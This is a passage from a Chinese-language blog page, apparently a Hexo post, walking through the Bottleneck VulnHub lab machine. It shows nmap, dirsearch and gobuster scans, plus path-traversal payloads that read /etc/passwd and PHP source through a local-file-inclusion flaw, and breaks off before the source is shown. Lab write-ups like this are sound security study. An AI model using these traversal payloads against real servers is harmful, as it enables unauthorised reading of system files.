@@ -1,0 +1,1275 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon-120x120.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"w01n.github.io","root":"/","scheme":"Pisces","version":"7.7.2","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="十篇 walkthrough">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub Walkthrough(一)">
+<meta property="og:url" content="https://w01n.github.io/2020/03/18/VulnHub-Walkthrough-%E4%B8%80/index.html">
+<meta property="og:site_name" content="oslo&#39;S Blog">
+<meta property="og:description" content="十篇 walkthrough">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/1.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/2.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/3.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/4.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/5.png">
+<meta property="og:image" content="c:/Users/Administrator/Desktop/Folders/blog/botteneck%20img/6.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/7.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/8.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/9.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/10.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/11.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/12.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/13.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/14.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/15.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/16.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/17.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/18.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/19.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/20.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/21.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/22.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/23.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/24.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/25.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/26.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/27.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/28.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/29.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/30.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/31.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/32.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/33.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/34.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/35.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/37.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/38.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/1.png">
+<meta property="og:image" content="c:/Users/Administrator/Desktop/Folders/blog/CyNix%20img/2.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/3.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/4.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/5.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/6.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/7.png">
+<meta property="og:image" content="c:/Users/Administrator/Desktop/Folders/blog/CyNix%20img/8.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/9.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/10.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/11.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/12.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/14.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/15.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/17.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/18.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/19.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/20.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/21.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/CyNix%20img/22.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/1.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/2.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/3.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/4.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/5.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/6.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/7.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/8.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/9.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/10.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/11.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/12.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/13.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/14.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/15.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/16.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/18.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/19.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/20.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/21.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/22.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/DC-9%20img/23.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/1.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/2.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/3.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/4.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/5.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/6.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/8.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/9.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/10.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/11.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/12.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/13.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/14.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/15.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/16.png">
+<meta property="og:image" content="c:/Users/Administrator/Desktop/Folders/blog/djinn%20img/17.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/18.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/19.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/20.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/21.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/22.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/23.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/24.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/djinn%20img/25.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/EVM%20Iimg/1.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/EVM%20Iimg/2.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/EVM%20Iimg/3.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/EVM%20Iimg/4.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/EVM%20Iimg/5.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/EVM%20Iimg/6.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/EVM%20Iimg/7.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/EVM%20Iimg/8.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/EVM%20Iimg/9.png">
+<meta property="og:image" content="https://w01n.github.io/images/vulnhub/EVM%20Iimg/10.png">
+<meta property="article:published_time" content="2020-03-18T08:05:55.000Z">
+<meta property="article:modified_time" content="2020-03-18T08:05:55.000Z">
+<meta property="article:author" content="Oslo">
+<meta property="article:tag" content="VulnHub">
+<meta property="article:tag" content="Walkthrough">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://w01n.github.io/images/vulnhub/botteneck%20img/1.png">
+
+<link rel="canonical" href="https://w01n.github.io/2020/03/18/VulnHub-Walkthrough-%E4%B8%80/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>VulnHub Walkthrough(一) | oslo'S Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="oslo'S Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">oslo'S Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Self Recording</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">3</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://w01n.github.io/2020/03/18/VulnHub-Walkthrough-%E4%B8%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Oslo">
+      <meta itemprop="description" content="You guilty , You died">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="oslo'S Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulnHub Walkthrough(一)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-18 16:05:55" itemprop="dateCreated datePublished" datetime="2020-03-18T16:05:55+08:00">2020-03-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Walkthrough/" itemprop="url" rel="index"><span itemprop="name">Walkthrough</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>18k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>17 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="十篇-walkthrough"><a href="#十篇-walkthrough" class="headerlink" title="十篇 walkthrough"></a>十篇 walkthrough</h1> <a id="more"></a> 
+
+<h1 id="Bottleneck-walkthrough"><a href="#Bottleneck-walkthrough" class="headerlink" title="Bottleneck walkthrough"></a>Bottleneck walkthrough</h1><h2 id="写在前面：P"><a href="#写在前面：P" class="headerlink" title="写在前面：P"></a>写在前面：P</h2><p>最近看了 <strong>ins1ght</strong> 老哥写的很多VulnHub的walkthrough，感觉很好玩，自己也一直想搞搞vulnhub的靶场来玩玩，奈何自己太菜了</p>
+<p>后来问了 <strong>ins1ght</strong> 老哥，靶场直接下载下来就可以用，而且也是个锻炼自己的方式，也可以给自己的博客多一篇水文 所有就试着搞了一下 然后写了这第一篇的vulnhub的walkthrough</p>
+<h2 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h2><p>靶机介绍：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bottleneck is an intermediate boot2root machine.</span><br><span class="line">After some cyber attacks the admin hardened the system, show him that it&#39;s not so secure.</span><br><span class="line">If you need a hint feel free to contact me on Twitter: @bytevsbyt3</span><br></pre></td></tr></table></figure>
+
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20v" title="https://www.vulnhub.com/">VulnHub官网<i class="fa fa-external-link"></i></span></p>
+<p>VulnHub我就不多介绍了 网上很多相关的介绍 官网也有很多靶场可以下载</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYm90dGxlbmVjay0xLDM3NC8=" title="https://www.vulnhub.com/entry/bottleneck-1,374/">Bottleneck靶机地址<i class="fa fa-external-link"></i></span></p>
+<p>靶机下载下来可以直接使用 虚拟机导入(我用的vmware15) 然后直接开启虚拟机 就不用管了</p>
+<h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>第一步都是信息收集 常规套路就不多说了 这篇文章可以看一下</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE0Mjc2Ny5odG1s" title="https://www.freebuf.com/articles/web/142767.html">信息收集浅谈<i class="fa fa-external-link"></i></span></p>
+<p>靶机是个ubuntu系统</p>
+<img data-src="/images/vulnhub/botteneck img/1.png" style="zoom:45%;" />
+
+<p>(这里打开靶机的时候走了一个坑 应该是用VirtualBox导入它提供的ova文件</p>
+<p>然后正常启动就可以了)</p>
+<p>攻击机我用的Kali Kali也不多说了(kali用好 牢饭管好)</p>
+<p>可以先用nmap扫一下网段内的主机(nmap用法google就可以了 我这里就直接用了)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PI -PT 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/2.png" style="zoom:45%;" />
+
+<p>我用的VirtualBox开得虚拟机 当然就是这个IP了</p>
+<p>也可以在浏览器访问一下这个IP来判断是不是靶机</p>
+<img data-src="/images/vulnhub/botteneck img/3.png" style="zoom:50%;" />
+
+<p>下面我们可以收集收集有没有一些敏感信息泄露的地方(扫一波目录先)</p>
+<p>我用的是dirsearch(Github上面有 可以自己下载使用)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 dirsearch.py -u http:&#x2F;&#x2F;192.168.1.104 -e all</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/4.png" style="zoom:50%;" />
+
+<p>扫了之后发现只有一个index.php 应该就是显示的首页 其他的是几个文件夹</p>
+<p>然后借鉴了<strong>ins1ght</strong>老哥用的gobuster来枚举还有没有其他一些东西 使用gobuster需要自己建一个字典(-w 参数)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.104 -w &#x2F;root&#x2F;桌面&#x2F;big_dict.txt -x .php,.txt,.html,.zip</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/5.png" style="zoom:50%;" />
+
+<img data-src="C:\Users\Administrator\Desktop\Folders\blog\botteneck img\6.png" style="zoom:50%;" />
+
+<p>上面图片是一些枚举的结果</p>
+<p>目前得到的目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;css</span><br><span class="line">&#x2F;img</span><br><span class="line">&#x2F;js</span><br><span class="line">&#x2F;vendor</span><br><span class="line">&#x2F;index.php</span><br><span class="line">&#x2F;image_gallery.php</span><br></pre></td></tr></table></figure>
+
+<p>可以在浏览器访问一下首页</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.104&#x2F;index.php</span><br></pre></td></tr></table></figure>
+
+<p>(emm… 面具挺好看)</p>
+<p>拿我们之前gobuster扫出来的东西试试 挨个访问一下 也是毛都没有</p>
+<p>不过还有一个image_gallery.php 访问一下试试 然后就发现有点东西了</p>
+<img data-src="/images/vulnhub/botteneck img/7.png" style="zoom:50%;" />
+
+<p>这段base64拿去解码出来就是bottleneck_dontbe.png 访问一下</p>
+<p>在img文件夹下能访问到</p>
+<img data-src="/images/vulnhub/botteneck img/8.png" style="zoom:50%;" />
+
+<p>这不就让我想到了之前打DDCTF的一道题 构造文件名的base64 任意文件的读取<br>刚才上面gobuster扫出来的试了一波 什么都不能读到 虽然返回状态是200 但是服务器应该做了限制 所以这里任意文件读取是没有利用点的</p>
+<p>在这可以看到这些应该是访问返回这张图片的数据流</p>
+<img data-src="/images/vulnhub/botteneck img/9.png" style="zoom:50%;" />
+
+<p>能读到PNG图片的数据流 又问了一下<strong>ins1ght</strong>老哥 自己还是太菜了 老哥说考虑往LFI(本地文件包含)的利用点试一下 <span class="exturl" data-url="aHR0cDovL3d3dy5vc2xvLm1vbnN0ZXIvMjAxOS8xMS8yMC9Cb3R0bGVuZWNr6Z225py6V2Fsa3Rocm91Z2gvW2h0dHBzOi8vY2h5YmV0YS5naXRodWIuaW8vMjAxNy8xMC8wOC9waHDmlofku7bljIXlkKvmvI/mtJ4vXShodHRwczovL2NoeWJldGEuZ2l0aHViLmlvLzIwMTcvMTAvMDgvcGhw5paH5Lu25YyF5ZCr5ryP5rSeLyk=" title="http://www.oslo.monster/2019/11/20/Bottleneck靶机Walkthrough/[https://chybeta.github.io/2017/10/08/php文件包含漏洞/](https://chybeta.github.io/2017/10/08/php文件包含漏洞/)">文件包含参考(chybeta师傅tql)<i class="fa fa-external-link"></i></span></p>
+<p>最后可以用nmap扫一下开放的端口和服务之类的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -T4 -A -p- 192.168.1.104</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/botteneck img/10.png" style="zoom:50%;" />
+
+<p>OK 扫到这里就发现有点东西了 SSH的22端口 HTTP默认的80端口</p>
+<p>服务器是Nginx 那我们就知道一点简单的信息(IP+端口+服务器)</p>
+<h2 id="0x01-LFI利用点"><a href="#0x01-LFI利用点" class="headerlink" title="0x01 LFI利用点"></a>0x01 LFI利用点</h2><p>既然发现是LFI的洞 先重发一下能不能读到返回的内容</p>
+<p>用Bp 抓包重放一下试试</p>
+<img data-src="/images/vulnhub/botteneck img/11.png" style="zoom:50%;" />
+
+<p>这里看到返回是 200 但是却什么东西都没有 再多抓几次 看看t这个参数是不是有猫腻</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t&#x3D;1574390048&amp;f&#x3D;Ym90dGxlbmVja19kb250YmUucG5n</span><br><span class="line">t&#x3D;1574389727&amp;f&#x3D;Ym90dGxlbmVja19kb250YmUucG5n</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到t已经变了 f没变 所以这里就可以想到f之前转码后是文件名 应该是不会变的 而这个t 猜的话应该就是时间戳(TimeStamp) 而我们想要得到东西的话 我们传的这个参数t的值应该是要和服务器一致的才行 先看看攻击机和靶机的时间</p>
+<img data-src="/images/vulnhub/botteneck img/12.png" style="zoom:50%;" />
+
+<p>感觉没差多少 应该是一致的 那么我们就可以写个对应的脚本跑一下</p>
+<p>(exp脚本我这里就不放了 怕有人来敲门)</p>
+<p>先构造一个字典 字典里面用最开始gobuster扫出来的那些内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bottleneck_dontbe.png</span><br></pre></td></tr></table></figure>
+
+<p>可以先用脚本跑一下能不能获取到这个图片的内容 获取到之后直接后缀名改png可以正常查看图片内容 那就脚本可用 就继续试一下其他payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;passwd.php</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd.php</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd.php</span><br></pre></td></tr></table></figure>
+
+<p>返回了这个东西</p>
+<img data-src="/images/vulnhub/botteneck img/13.png" style="zoom:50%;" />
+
+<p>emm 继续搞 读一下php源码试试(image_gallery.php)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line">CHANGELOG</span><br><span class="line">v1.1: Still testing without content.I&#39;ve fixed that problem that @p4w and @ska notified me after hacker attack.Shit I&#39;m too lazy to make a big review of my code.I think that the LFI problem can be mitigated with the blacklist.By the way to protect me from attackers, all malicious requests are immediately sent to the SOC</span><br><span class="line">v1.0: Starting this beautiful gallery</span><br><span class="line">*&#x2F;</span><br><span class="line">$tstamp &#x3D; time();</span><br><span class="line">if(isset($_GET[&#39;t&#39;]) &amp;&amp; isset($_GET[&#39;f&#39;]))&#123;</span><br><span class="line">    include_once &#39;image_gallery_load.php&#39;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读到的源文件的前面一部分 可以看到changelog哪里说明是LFI漏洞了</p>
+<p>下面代码看到还有一个image_gallery_load.php的文件 那就在读一下</p>
+<img data-src="/images/vulnhub/botteneck img/14.png" style="zoom:50%;" />
+
+<p>下面是源码：</p>
